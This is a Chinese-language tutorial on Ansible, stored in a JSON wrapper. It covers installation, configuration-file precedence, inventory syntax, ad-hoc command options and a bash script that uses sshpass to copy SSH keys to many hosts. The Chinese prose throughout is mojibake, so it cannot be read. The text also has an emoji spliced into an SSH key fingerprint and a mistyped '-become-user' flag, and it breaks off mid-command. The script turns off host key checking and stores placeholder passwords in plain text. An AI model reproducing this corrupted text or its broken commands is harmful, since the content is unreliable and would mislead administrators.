[{"content":"1 Ansible ç®€ä»‹ 1.1 Ansible å‘å±•å² ä½œè€…ï¼šMichael DeHaanï¼ˆ Cobbler ä¸ Func ä½œè€…ï¼‰\nAnsible çš„åç§°æ¥è‡ªç§‘å¹»å°è¯´ã€Šå®‰å¾·çš„æ¸¸æˆã€‹ä¸­è·¨è¶Šæ—¶ç©ºçš„å³æ—¶é€šä¿¡å·¥å…·ï¼Œä½¿ç”¨å®ƒå¯ä»¥åœ¨ç›¸è·æ•°å…‰å¹´çš„è·ç¦»ï¼Œè¿œç¨‹å®æ—¶æ§åˆ¶å‰çº¿çš„èˆ°é˜Ÿæˆ˜æ–—ã€‚\n2012-03-09ï¼Œå‘å¸ƒ0.0.1ç‰ˆï¼Œ2015-10-17ï¼ŒRed Hatå®£å¸ƒ1.5äº¿ç¾å…ƒæ”¶è´­Ansibleã€‚\nAnsibleã€Œ2.9ã€ ä¸­æ–‡å®˜æ–¹æ–‡æ¡£ â€” Ansible Documentation (cn-ansibledoc.readthedocs.io)\n1.2 Ansible åŠŸèƒ½ æ‰¹é‡è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€å®‰è£…å’Œé…ç½®å„ç§æœåŠ¡ åˆ©ç”¨ Playbook å’Œ Role ç¼–æ’ä¼ä¸šçº§çš„å¤æ‚çš„ IT æ¶æ„ä»»åŠ¡ æä¾›è‡ªåŠ¨åŒ–è¿ç»´å·¥å…·çš„å¼€å‘ APIï¼Œå¦‚ JumpServer å°±æ˜¯åŸºäº Ansible å®ç°è‡ªåŠ¨åŒ–ç®¡ç†åŠŸèƒ½ 1.3 Ansible ç‰¹ç‚¹ 1.3.1 ä¼˜ç‚¹ åŠŸèƒ½ä¸°å¯Œï¼šæ¨¡å—æ•°é‡è¾¾æ•°åƒä¸ªï¼Œä¸”æ”¯æŒè‡ªå®šä¹‰æ¨¡å—å’Œå¤šæ•°ç¼–ç¨‹è¯­è¨€ ç®€å•æ˜“ç”¨ï¼šAnsible ä¸ä½¿ç”¨ C/S æ¶æ„ç®¡ç†èŠ‚ç‚¹ï¼Œå³æ²¡æœ‰ Agentï¼Œå»ä¸­å¿ƒåŒ–ç®¡ç†æ–¹å¼ å®‰å…¨ï¼šåŸºäº OpenSSH åè®®å®ç°å®‰å…¨é€šè®¯ï¼Œæ— éœ€ä¸“ç”¨åè®® å¹‚ç­‰æ€§ï¼šå¯ä»¥é‡å¤å¤šæ¬¡æ‰§è¡Œï¼Œå¯¹ç³»ç»Ÿä¸ä¼šäº§ç”Ÿå½±å“ ä½¿ç”¨ YAML æ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼Œç®€å•æ˜“è¯» Playbook å’Œ Role æ”¯æŒç¼–æ’å¤æ‚ä»»åŠ¡ï¼Œå¢å¼ºä»£ç å¤ç”¨æ€§ Python è¯­è¨€å®ç°, åŸºäº Paramikoï¼ˆ python å¯¹ ssh çš„å®ç°ï¼‰ï¼ŒPyYAMLï¼ŒJinja2ï¼ˆæ¨¡æ¿è¯­è¨€ï¼‰ä¸‰ä¸ªå…³ é”®æ¨¡å— 1.3.2 ç¼ºç‚¹ ç®¡ç†ä¸»æœºè¾ƒå¤šæ—¶ï¼Œæ‰§è¡Œæ•ˆç‡ä¸å¦‚ saltstack å½“å‰è¿˜ä¸æ”¯æŒåƒ MySQL æ•°æ®åº“ç±»ä¼¼çš„äº‹åŠ¡å›æ»š 1.4 æ¶æ„ 1.4.1 Ansible ç»„æˆ ä¸‹å›¾ä¸­ç»¿æ¡†å†…çš„æ˜¯ Ansible æ ¸å¿ƒç»„ä»¶ï¼Œæ˜¯ Ansible çš„å‘½ä»¤æ‰§è¡Œå·¥å…·\nç»„ä»¶ä»‹ç»ï¼š\nINVENTORYï¼šAnsible ç®¡ç†ä¸»æœºçš„æ¸…å•æ–‡ä»¶ï¼Œé»˜è®¤ä¸º /etc/ansible/hosts\nMODULESï¼šAnsible æ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½æ¨¡å—ï¼Œå¤šæ•°ä¸ºå†…ç½®æ ¸å¿ƒæ¨¡å—ï¼Œä¹Ÿå¯è‡ªå®šä¹‰\nPLUGINSï¼šæ¨¡å—åŠŸèƒ½çš„è¡¥å……ï¼Œå¦‚è¿æ¥ç±»å‹æ’ä»¶ã€å¾ªç¯æ’ä»¶ã€å˜é‡æ’ä»¶ã€è¿‡æ»¤æ’ä»¶ç­‰ï¼Œè¯¥åŠŸèƒ½ä¸å¸¸ç”¨\nAPIï¼šä¾›ç¬¬ä¸‰æ–¹ç¨‹åºè°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£\n1.4.2 Ansible å‘½ä»¤æ‰§è¡Œæ¥æº USER æ™®é€šç”¨æˆ·ï¼Œå³ SYSTEM ADMINISTRATOR PLAYBOOKSï¼šä»»åŠ¡å‰§æœ¬ï¼ˆä»»åŠ¡é›†ï¼‰ï¼Œç¼–æ’å®šä¹‰ Ansible ä»»åŠ¡é›†çš„é…ç½®æ–‡ä»¶ï¼Œç”± Ansible é¡ºåºä¾æ¬¡æ‰§è¡Œ CMDBï¼ˆé…ç½®ç®¡ç†æ•°æ®åº“ï¼‰ API è°ƒç”¨ PUBLIC/PRIVATE CLOUD APIè°ƒç”¨ USER-\u0026gt; Ansible Playbook -\u0026gt; Ansibile 1.4.3 æ³¨æ„äº‹é¡¹ å®‰è£…äº† ansible çš„ä¸»æœºå®˜æ–¹ç§°ä¹‹ä¸ºç®¡ç†æœºï¼Œå·¥ä½œä¸­ä¹Ÿå¸¸ç§°ä¹‹ä¸ºï¼šä¸­æ§ã€ä¸»æ§ã€master æˆ–è€…å ¡å’æœº\nè¢«ç®¡ç†çš„ä¸»æœºä¸€èˆ¬ç§°ä¹‹ä¸ºå—ç®¡ç†èŠ‚ç‚¹ï¼Œè¢«æ§ç«¯ï¼Œå—æ§ç«¯\nç®¡ç†æœº Python ç‰ˆæœ¬éœ€è¦ 2.6 åŠä»¥ä¸Š\nå—ç®¡ç†èŠ‚ç‚¹ Python ç‰ˆæœ¬ä½äº 2.4 ï¼Œéœ€è¦å®‰è£… python-simplejson\nå—ç®¡ç†èŠ‚ç‚¹å¦‚æœå¯ç”¨ SELinux ï¼Œéœ€è¦å®‰è£… libselinux-python\nWindows ä¸èƒ½åšä¸ºç®¡ç†æœºï¼Œåªèƒ½æ˜¯å—ç®¡ç†èŠ‚ç‚¹\n2 Ansible å®‰è£…å’Œå¸¸è§æ¨¡å— 2.1 Ansible å®‰è£… ä¸­æ–‡æ–‡æ¡£ï¼šå®‰è£… Ansible â€” Ansible Documentation (cn-ansibledoc.readthedocs.io)\nè‹±æ–‡æ–‡æ¡£ï¼šAnsible Documentation â€” Ansible Documentation\nCentOS å®‰è£…:\nyum install -y ansible Ubuntu å®‰è£…ï¼š\napt install -y ansible pip å®‰è£…ï¼ˆä¸æ¨èï¼‰ï¼š\npip install ansible æŸ¥çœ‹å·²å®‰è£…çš„ ansible ç‰ˆæœ¬\nansible --version 2.2 Ansible ç›¸å…³æ–‡ä»¶ 2.2.1 Ansible é…ç½®æ–‡ä»¶åˆ—è¡¨ /etc/ansible/ansible.cfg ä¸»é…ç½®æ–‡ä»¶ï¼Œå¦‚æœéœ€è¦ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªé¡¹ç›®åˆ›å»ºç‹¬æœ‰çš„ ansible.cfg æ–‡ä»¶ã€‚ /etc/ansible/hosts ä¸»æœºæ¸…å•æ–‡ä»¶ï¼ŒåŒ…å«æ‰€æœ‰å—ç®¡ç†èŠ‚ç‚¹çš„ IP åŠå…¶ä»–ç›¸å…³ä¿¡æ¯ /etc/ansible/roles å­˜æ”¾å„ä¸ªè§’è‰²çš„ç›®å½• 2.2.2 Ansible ä¸»é…ç½®æ–‡ä»¶ Ansible çš„é…ç½®æ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªæ¥æºï¼Œä¼˜å…ˆçº§ä»é«˜åˆ°ä½é¡ºåºå¦‚ä¸‹ï¼š\nANSIBLE_CONFIG #ç¯å¢ƒå˜é‡ ./ansible.cfg\t~/.ansible.cfg /etc/ansible/ansible.cfg\t#ç³»ç»Ÿé»˜è®¤é…ç½® Ansible çš„é»˜è®¤é…ç½®æ–‡ä»¶ /etc/ansible/ansible.cfg ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ³¨é‡Šå†…å®¹å³ä¸ºé»˜è®¤å€¼ï¼Œæ²¡æœ‰ç‰¹æ®Šéœ€è¦ï¼Œå¯ä»¥ä¸ç”¨ä¿®æ”¹ã€‚\n[defaults] # some basic default values... #inventory = /etc/ansible/hosts #library = /usr/share/my_modules/ #module_utils = /usr/share/my_module_utils/ #remote_tmp = ~/.ansible/tmp #local_tmp = ~/.ansible/tmp #plugin_filters_cfg = /etc/ansible/plugin_filters.yml #forks = 5 #poll_interval = 15 #sudo_user = root #ask_sudo_pass = True #ask_pass = True #transport = smart #remote_port = 22 #module_lang = C #module_set_locale = False # plays will gather facts by default, which contain information about èŒƒä¾‹ï¼šé€šè¿‡ç¯å¢ƒå˜é‡ ANSIBLE_CONFIG æŒ‡å®š ansible é…ç½®æ–‡ä»¶è·¯å¾„\n[root@ansible ~]# ll /data/ansible.cfg # å¹¶ä¸å­˜åœ¨çš„é…ç½®æ–‡ä»¶ ls: cannot access /data/ansible.cfg: No such file or directory [root@ansible ~]# export ANSIBLE_CONFIG=/data/ansible.cfg [root@ansible ~]# ansible --version ansible 2.9.27 config file = /etc/ansible/ansible.cfg # è¿˜æ˜¯é»˜è®¤é…ç½®æ–‡ä»¶ configured module search path = [u\u0026#39;/root/.ansible/plugins/modules\u0026#39;, u\u0026#39;/usr/share/ansible/plugins/modules\u0026#39;] ansible python module location = /usr/lib/python2.7/site-packages/ansible executable location = /usr/bin/ansible python version = 2.7.5 (default, Oct 30 2018, 23:45:53) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] [root@ansible ~]# touch /data/ansible.cfg #åˆ›å»ºæ­¤æ–‡ä»¶ [root@ansible ~]# ansible --version ansible 2.9.27 config file = /data/ansible.cfg # æˆåŠŸæŒ‡å®š configured module search path = [u\u0026#39;/root/.ansible/plugins/modules\u0026#39;, u\u0026#39;/usr/share/ansible/plugins/modules\u0026#39;] ansible python module location = /usr/lib/python2.7/site-packages/ansible executable location = /usr/bin/ansible python version = 2.7.5 (default, Oct 30 2018, 23:45:53) [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)] 2.2.3 Inventory ä¸»æœºæ¸…å•æ–‡ä»¶ ansible çš„ä¸»è¦åŠŸèƒ½åœ¨äºæ‰¹é‡ç®¡ç†ä¸»æœºï¼Œè¿™äº›è¢«ç®¡ç†çš„ä¸»æœºå°±ä½¿ç”¨ inventory æ–‡ä»¶æ¥æŒ‡å®šã€‚\nç”Ÿäº§ç¯å¢ƒå¯ä»¥ä¸ºæ¯ä¸ªé¡¹ç›®åˆ›å»ºç‹¬æœ‰çš„ ansible.cfg æ–‡ä»¶å’Œ hosts æ–‡ä»¶ï¼Œå®ç°é¡¹ç›®ä¹‹å‰çš„éš”ç¦»ç®¡ç†ã€‚\nå®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.ansible.com/ansible/latest/user_guide/intro_inventory.html\nä¸»æœºæ¸…å•æ–‡ä»¶æ ¼å¼\ninventory æ–‡ä»¶éµå¾ª INI æ–‡ä»¶é£æ ¼ï¼Œå¯ä»¥å¯¹ä¸»æœºè¿›è¡Œåˆ†ç»„ç®¡ç†ï¼Œä¸”å¯ä»¥é’ˆå¯¹æ¯ä¸ªä¸»æœºæŒ‡å®šéé»˜è®¤çš„ç«¯å£å’Œè´¦å·ç­‰ä¿¡æ¯\nå¸¸ç”¨ Inventory å‚æ•°è¯´æ˜\nansible_ssh_host # è¿œç¨‹ä¸»æœºåä¸æƒ³è¦è®¾å®šçš„ä¸»æœºçš„åˆ«åä¸åŒçš„è¯ï¼Œå¯é€šè¿‡æ­¤å˜é‡è®¾ç½®ã€‚ ansible_ssh_port # ssh ç«¯å£å·ï¼Œå¦‚æœä¸æ˜¯é»˜è®¤çš„ç«¯å£å·ï¼Œé€šè¿‡æ­¤å˜é‡è®¾ç½®ã€‚æˆ–è€…ip:ç«¯å£çš„å½¢å¼æŒ‡å®š 192.168.1.100:2222 ansible_ssh_user # ssh ç”¨æˆ·å ansible_ssh_pass # ssh å¯†ç (è¿™ç§æ–¹å¼å¹¶ä¸å®‰å…¨ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ --ask-pass æˆ–è€…é…ç½® ssh å…å¯†) ansible_sudo_pass # sudo å¯†ç (è¿™ç§æ–¹å¼å¹¶ä¸å®‰å…¨ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨ --ask-sudo-pass) ansible_sudo_exe (new in version 1.8) # sudo å‘½ä»¤è·¯å¾„(é€‚ç”¨äº1.8åŠä»¥ä¸Šç‰ˆæœ¬) ansible_connection # ä¸ä¸»æœºçš„è¿æ¥ç±»å‹.æ¯”å¦‚:local, ssh æˆ–è€… paramikoã€‚ Ansible 1.2 ä»¥å‰é»˜è®¤ä½¿ç”¨ paramikoã€‚1.2 ä»¥åé»˜è®¤ä½¿ç”¨ \u0026#39;smart\u0026#39;ï¼Œ\u0026#39;smart\u0026#39; æ–¹å¼ä¼šæ ¹æ®æ˜¯å¦æ”¯æŒ ControlPersist, æ¥åˆ¤æ–­\u0026#39;ssh\u0026#39; æ–¹å¼æ˜¯å¦å¯è¡Œã€‚ ansible_ssh_private_key_file # ssh ä½¿ç”¨çš„ç§é’¥æ–‡ä»¶ï¼Œé€‚ç”¨äºæœ‰å¤šä¸ªå¯†é’¥ï¼Œè€Œä½ ä¸æƒ³ä½¿ç”¨ ssh ä»£ç†çš„æƒ…å†µã€‚ ansible_shell_type # ç›®æ ‡ç³»ç»Ÿçš„ shell ç±»å‹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå‘½ä»¤çš„æ‰§è¡Œä½¿ç”¨ \u0026#39;sh\u0026#39; è¯­æ³•, å¯è®¾ç½®ä¸º\u0026#39;csh\u0026#39; æˆ– \u0026#39;fish\u0026#39;ã€‚ ansible_python_interpreter # ç›®æ ‡ä¸»æœºçš„ python è·¯å¾„ï¼Œé€‚ç”¨äºçš„æƒ…å†µ: ç³»ç»Ÿä¸­æœ‰å¤šä¸ª Python, æˆ–è€…å‘½ä»¤è·¯å¾„ä¸æ˜¯\u0026#34;/usr/bin/python\u0026#34;ï¼Œæ¯”å¦‚ \\*BSD, æˆ–è€… /usr/bin/python ä¸æ˜¯ 2.X ç‰ˆæœ¬çš„Pythonã€‚ä¹‹æ‰€ä»¥ä¸ä½¿ç”¨ \u0026#34;/usr/bin/env\u0026#34; æœºåˆ¶ï¼Œå› ä¸ºè¿™è¦æ±‚è¿œç¨‹ç”¨æˆ·çš„è·¯å¾„è®¾ç½®æ­£ç¡®ï¼Œä¸”è¦æ±‚ \u0026#34;python\u0026#34; å¯æ‰§è¡Œç¨‹åºåä¸å¯ä¸º python ä»¥å¤–çš„åå­—(å®é™…æœ‰å¯èƒ½åä¸ºpython26) èŒƒä¾‹ï¼šä¸»æœºå’Œç»„åµŒå¥—\nntp.time.org [databases] www.db1.org:2222 www.db2.org [web] www.web1.com www.web2.com [proxy] pro[1:3].test.com pro-db[a:f].test.com # server ç»„æˆå‘˜ï¼šweb, proxy [server:children] # children æ˜¯å†…ç½®å˜é‡ web proxy èŒƒä¾‹ï¼šåŸºäºç”¨æˆ·åå’Œå¯†ç è¿æ¥\n[test] 10.0.0.1 ansible_connection=local #æŒ‡å®šæœ¬åœ°è¿æ¥æ–¹å¼ï¼Œå¦‚ï¼šssh localhost 10.0.0.2 ansible_connection=ssh ansible_ssh_port=2222 ansible_ssh_user=user ansible_ssh_password=passwd 10.0.0.3 ansible_ssh_user=test ansible_ssh_password=test [web] web01 ansible_ssh_host=10.0.0.5 # web01 ä¸ºåˆ«å web02 ansible_ssh_host=10.0.0.6 [web:vars] # vars æ˜¯å†…ç½®å˜é‡ï¼Œè¿™é‡Œä¸º web ç»„å†…çš„æˆå‘˜å®šä¹‰äº†ä¸€ä¸ªç»„å˜é‡ ansible_ssh_password=test 2.3 Ansible ç›¸å…³å·¥å…· /usr/bin/ansible ä¸»ç¨‹åºï¼Œä¸´æ—¶å‘½ä»¤æ‰§è¡Œå·¥å…· /usr/bin/ansible-doc æŸ¥çœ‹é…ç½®æ–‡æ¡£ï¼Œæ¨¡å—åŠŸèƒ½æŸ¥çœ‹å·¥å…·,ç›¸å½“äºman /usr/bin/ansible-playbook å®šåˆ¶è‡ªåŠ¨åŒ–ä»»åŠ¡ï¼Œç¼–æ’å‰§æœ¬å·¥å…·,ç›¸å½“äºè„šæœ¬ /usr/bin/ansible-pull è¿œç¨‹æ‰§è¡Œå‘½ä»¤çš„å·¥å…· /usr/bin/ansible-vault æ–‡ä»¶åŠ å¯†å·¥å…· /usr/bin/ansible-console åŸºäºConsoleç•Œé¢ä¸ç”¨æˆ·äº¤äº’çš„æ‰§è¡Œå·¥å…· /usr/bin/ansible-galaxy ä¸‹è½½/ä¸Šä¼ ä¼˜ç§€ä»£ç æˆ–Rolesæ¨¡å—çš„å®˜ç½‘å¹³å° åˆ©ç”¨ ansible å®ç°ç®¡ç†çš„ä¸»è¦æ–¹å¼ï¼š\nAnsible Ad-Hoc ä¸»è¦ç”¨äºå‘½ä»¤è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œé€‚åˆäºç®€å•ä»»åŠ¡ Ansible playbook ä¸»è¦ç”¨äºé•¿æœŸè§„åˆ’å¥½çš„ï¼Œå¤§å‹é¡¹ç›®åœºæ™¯ ansible ä½¿ç”¨å‰å‡†å¤‡ï¼š\nansible å¤§éƒ¨åˆ†å·¥å…·ä½¿ç”¨ ssh åè®®æ¥è¿›è¡Œè¿œç¨‹ä¸»æœºç®¡ç†ï¼Œå› æ­¤åœ¨ä½¿ç”¨æ­¤å·¥å…·å‰éœ€è¦é…ç½®å¥½å¯†é’¥è®¤è¯ï¼Œå¦‚æœä½¿ç”¨å¯†ç éªŒè¯ä¼šå¾ˆéº»çƒ¦ï¼Œè€Œä¸”å¹¶ä¸å®‰å…¨ã€‚\nåœ¨é¦–æ¬¡ ssh æŸå°ä¸»æœºæ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªæ˜¯å¦ä¿¡ä»»ä¸»æœºçš„æç¤ºï¼š\n[root@ansible ~]# ssh localhost The authenticity of host \u0026#39;localhost (::1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:kFbXYFVk/H+j5h1JTkIf9HAw+zXbWQIHqG03FutZJ3E. ECDSA key fingerprint is MD5:7b:d4:06:49:45:fa:58:b0ğŸ’¿de:ef:bc:1e:14:09:f3. Are you sure you want to continue connecting (yes/no)? å¯ä»¥ä¿®æ”¹ /etc/ssh/ssh_configçš„é…ç½®æ¥é¿å…è¯¥æç¤ºï¼š\nStrictHostKeyChecking no ä»¥ä¸‹å‡†å¤‡äº†ä¸€ä¸ªè„šæœ¬æ¥å®ç° ssh å…å¯†ç™»å½•ï¼š\nå‡†å¤‡ä¸€ä¸ªæ¸…å•æ–‡ä»¶ï¼Œå†™å…¥ç›¸åº”çš„IP\n[root@ansible ~]# cat hosts.txt 10.0.0.1 10.0.0.2 10.0.0.3 è„šæœ¬å†…å®¹ï¼š\n#!/bin/bash # éœ€è¦ä¿®æ”¹çš„å‚æ•° ################### # è¯»å–ä¸»æœºåˆ—è¡¨æ–‡ä»¶ hosts_file=\u0026#34;hosts.txt\u0026#34; # è¿œç¨‹ç”¨æˆ·å remote_user=\u0026#34;your_username\u0026#34; # å¹¶å‘ä»»åŠ¡æ•°é‡ concurrency=10 # SSH å¯†ç  export ssh_password=\u0026#34;your_password\u0026#34; ########################## # é¢œè‰²å®šä¹‰ RED=\u0026#39;\\033[0;31m\u0026#39; GREEN=\u0026#39;\\033[0;32m\u0026#39; NC=\u0026#39;\\033[0m\u0026#39; # No Color # æ‰“å°å¸¦é¢œè‰²çš„æ¶ˆæ¯ print_message() { local message=\u0026#34;$1\u0026#34; local color=\u0026#34;$2\u0026#34; echo -e \u0026#34;${color}$message${NC}\u0026#34; } # æ£€æŸ¥ä¸»æœºåˆ—è¡¨æ–‡ä»¶æ˜¯å¦å­˜åœ¨ if [ ! -f \u0026#34;$hosts_file\u0026#34; ]; then echo -e \u0026#34;\\033[31mHosts file not found: $hosts_file\\033[0m\u0026#34; exit 1 fi # å®‰è£… sshpass rpm -q sshpass \u0026amp;\u0026gt; /dev/null || yum install -y sshpass # å®‰è£… parallel rpm -qi parallel \u0026amp;\u0026gt; /dev/null || yum install -y parallel # ç”Ÿæˆ id_rsa å¯†é’¥ [ -f /root/.ssh/id_rsa ] || ssh-keygen -f /root/.ssh/id_rsa -P \u0026#39;\u0026#39; # mkfifo åˆ›å»ºå‘½åç®¡é“ tempfifo=\u0026#34;/tmp/$$.fifo\u0026#34; mkfifo ${tempfifo} # å…³è”fifoæ–‡ä»¶å’Œfd6ï¼Œä½¿æ–‡ä»¶æè¿°ç¬¦ä¸ºéé˜»å¡å¼ exec 6\u0026lt;\u0026gt;${tempfifo} rm -f ${tempfifo} # ä¸ºæ–‡ä»¶æè¿°ç¬¦åˆ›å»ºå ä½ä¿¡æ¯ for ((i=1;i\u0026lt;=${concurrency};i++)) do { echo \u0026#34;\u0026#34; \u0026gt;\u0026amp;6 } done # é€è¡Œè¯»å–ä¸»æœºåˆ—è¡¨æ–‡ä»¶å¹¶æ‰§è¡Œä»»åŠ¡ while IFS= read -r host; do read -u6 ## read -u6å‘½ä»¤æ‰§è¡Œä¸€æ¬¡ï¼Œç›¸å½“äºå°è¯•ä»fd6ä¸­è·å–ä¸€è¡Œï¼Œå¦‚æœè·å–ä¸åˆ°ï¼Œåˆ™é˜»å¡è·å–åˆ°äº† ## ä¸€è¡Œåï¼Œfd6å°±å°‘äº†ä¸€è¡Œäº†ï¼Œå¼€å§‹å¤„ç†å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹æ”¾åœ¨åå°æ‰§è¡Œ { sshpass -p \u0026#34;$ssh_password\u0026#34; ssh-copy-id -o StrictHostKeyChecking=no \u0026#34;$remote_user@$host\u0026#34; \u0026amp;\u0026gt;/dev/null; exit_code=$? if [ $exit_code -eq 0 ]; then print_message \u0026#34;æˆåŠŸå…å¯†ä¸»æœº: $host\u0026#34; \u0026#34;$GREEN\u0026#34; else print_message \u0026#34;å¤±è´¥å…å¯†ä¸»æœº: $host\u0026#34; \u0026#34;$RED\u0026#34; fi echo \u0026#34;\u0026#34; \u0026gt;\u0026amp;6 # å®Œæˆåå†è¡¥å……ä¸€ä¸ªç©ºå€¼åˆ°fd6ä¸­ï¼Œé‡Šæ”¾ä¸€ä¸ªé” } \u0026amp; done \u0026lt; \u0026#34;$hosts_file\u0026#34; wait # å…³é—­fd6ç®¡é“ exec 6\u0026gt;\u0026amp;- 2.3.1 Ansible-doc æ­¤å·¥å…·ç”¨äºæ˜¾ç¤ºæ¨¡å—å¸®åŠ©æ–‡æ¡£ï¼Œç±»ä¼¼ man\nä½¿ç”¨æ ¼å¼ï¼š\nansible-doc [options] [module...] -l, --list # åˆ—å‡ºå¯ç”¨æ¨¡å— -s, --snippet # æ˜¾ç¤ºæŒ‡å®šæ¨¡å—çš„playbookç‰‡æ®µ å¸¸ç”¨é€‰é¡¹ï¼š\n# åˆ—å‡ºæ‰€æœ‰æ¨¡å— ansible-doc -l # æŸ¥çœ‹æŒ‡å®šæ¨¡å—å¸®åŠ©ç”¨æ³• ansible-doc ping # æŸ¥çœ‹å¸¸ç”¨playbooké€‰é¡¹ ansible-doc -s ping æŸ¥çœ‹æ¨¡å—ç›¸å…³çš„æ’ä»¶\n# connection æ¨¡å—ç›¸å…³ç»„ä»¶ ansible-doc -t connection -l # lookup æ¨¡å—ç›¸å…³ç»„ä»¶ ansible-doc -t lookup -l 2.3.2 Ansible 2.3.2.1 Ansible Ad-Hoc Ansible Ad-Hoc ä¸»è¦å°±æ˜¯ä½¿ç”¨ansibleä¸»ç¨‹åº\né€šå¸¸ç”¨æ¥æ‰§è¡Œä¸€æ¬¡æ€§ä»»åŠ¡ï¼Œä¸ä¼šä¿å­˜å‘½ä»¤æ‰§è¡Œçš„ä¿¡æ¯ï¼Œå¸¸ç”¨äºæµ‹è¯•åœºæ™¯\n2.3.2.2 Ansible å‘½ä»¤ç”¨æ³• æ ¼å¼ï¼š\nansible \u0026lt;host-pattern\u0026gt; [-m module_name] [-a args] å¸¸ç”¨é€‰é¡¹ï¼š\n--version\t# æŸ¥çœ‹ ansible ç‰ˆæœ¬å’Œé…ç½®æ–‡ä»¶è·¯å¾„ -m \u0026lt;module_name\u0026gt;\t# æŒ‡å®šä½¿ç”¨çš„æ¨¡å—ï¼Œä¸æŒ‡å®šé»˜è®¤ä¸º command -v # ç”¨äº debugï¼Œ-vv -vvv å¯æ˜¾ç¤ºæ›´è¯¦ç»†å‘½ä»¤æ‰§è¡Œè¿‡ç¨‹çš„æ—¥å¿— --list-hosts\t# æ˜¾ç¤ºæ¸…å•æ–‡ä»¶ä¸­çš„ä¸»æœºåˆ—è¡¨ -C, --check\t# æ¨¡æ‹Ÿæ‰§è¡Œï¼Œå¹¶ä¸å¯¹ç›®æ ‡ä¸»æœºåšå®é™…æ”¹åŠ¨ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥è¯­æ³• -T, --timeout=TIMEOUT # æŒ‡å®šå‘½ä»¤æ‰§è¡Œè¶…æ—¶æ—¶é—´ -k, --ask-pass # æç¤ºè¾“å…¥ ssh å¯†ç ï¼Œä½¿ç”¨å¯†ç éªŒè¯ï¼Œé»˜è®¤ä½¿ç”¨ key éªŒè¯ -u, --user=USERNAME # æŒ‡å®š sudo ç”¨æˆ·ï¼Œé»˜è®¤ä¸º root -b, --become # ä½¿ç”¨ sudo æœºåˆ¶ --become-user=USERNAME # æŒ‡å®š sudo çš„ç›®æ ‡ç”¨æˆ·ï¼Œé»˜è®¤ä¸º root -K, --ask-become-pass\t# æç¤ºè¾“å…¥ sudo å¯†ç  -f \u0026lt;forks_num\u0026gt;, --FORKS # æŒ‡å®šå¹¶å‘æ•° èŒƒä¾‹ï¼šä½¿ç”¨ localhost èµ°æœ¬åœ°åè®®ï¼Œå¹¶ä¸éœ€è¦å¯†ç ï¼ˆåŒ…æ‹¬ sudo å¯†ç ï¼‰ï¼š\n# ä»¥test ç”¨æˆ·æ‰§è¡Œæ“ä½œï¼Œ [root@ansible ~]# ansible localhost -m ping -u test localhost | SUCCESS =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;ping\u0026#34;: \u0026#34;pong\u0026#34; } # æŒ‡å®šäº†ç”¨æˆ·ä¸º testï¼Œä½†å¹¶æœªç”Ÿæ•ˆ [root@ansible ~]# ansible localhost -m shell -a \u0026#34;whoami\u0026#34; -u test localhost | CHANGED | rc=0 \u0026gt;\u0026gt; root # ä»¥ test ç”¨æˆ·ä½¿ç”¨ sudo æœºåˆ¶æ‰§è¡Œå‘½ä»¤ [root@ansible ~]# [root@ansible ~]# ansible localhost -m shell -a \u0026#34;whoami\u0026#34; -u test -b -become-user=root localhost | CHANGED | rc=0 \u0026gt;\u0026gt; root èŒƒä¾‹ï¼šä½¿ç”¨ IPè¿æ¥ï¼Œå¯è§‚æµ‹åˆ° ansible çš„ç›¸å…³ç‰¹æ€§\n# æœ¬æœºIP [root@ansible ~]# hostname -I 192.168.0.133 # å°†æœ¬æœºIPåŠ å…¥æ¸…å•æ–‡ä»¶ï¼ˆlocalhostä¸éœ€è¦æ˜¾å¼åŠ å…¥ï¼‰ [root@ansible ~]# grep $(hostname -I) /etc/ansible/hosts 192.168.0.133 # æ²¡æœ‰è¾“å…¥å¯†ç æç¤ºæƒé™ä¸è¶³ [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test 192.168.0.133 | UNREACHABLE! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;Failed to connect to the host via ssh: Permission denied (publickey,gssapi-keyex,gssapi-with-mic,password).\u0026#34;, \u0026#34;unreachable\u0026#34;: true } # åŠ å…¥ -k é€‰é¡¹è¾“å…¥å¯†ç ï¼ŒæˆåŠŸæ‰§è¡Œ [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test -k SSH password: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; test # sudo ä¹Ÿæ˜¯åŒæ ·çš„æƒ…å†µï¼Œä¸è¾“å…¥å¯†ç ä¼šæŠ¥é”™ [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test -k -b SSH password: 192.168.0.133 | FAILED | rc=-1 \u0026gt;\u0026gt; Missing sudo password # è¾“å…¥å¯†ç åæˆåŠŸæ‰§è¡Œ [root@ansible ~]# ansible 192.168.0.133 -m shell -a \u0026#34;whoami\u0026#34; -u test -k -b -K SSH password: BECOME password[defaults to SSH password]: 192.168.0.133 | CHANGED | rc=0 \u0026gt;\u0026gt; root èŒƒä¾‹ï¼šå¹¶å‘æ‰§è¡Œæ§åˆ¶\n# åˆ†åˆ«æ‰§è¡Œä¸€ä¸‹ä»¥ä¸‹ä¸¤ä¸ªå‘½ä»¤è§‚å¯Ÿè¿è¡Œæ•ˆæœï¼Œå¯ä»¥å‘ç°æ‰§è¡Œçš„ä¹‹é—´åŸºæœ¬ä¸€è‡´ [root@ansible ~]# ansible localhost -a \u0026#39;sleep 3\u0026#39; -f 1 [root@ansible ~]# ansible localhost -a \u0026#39;sleep 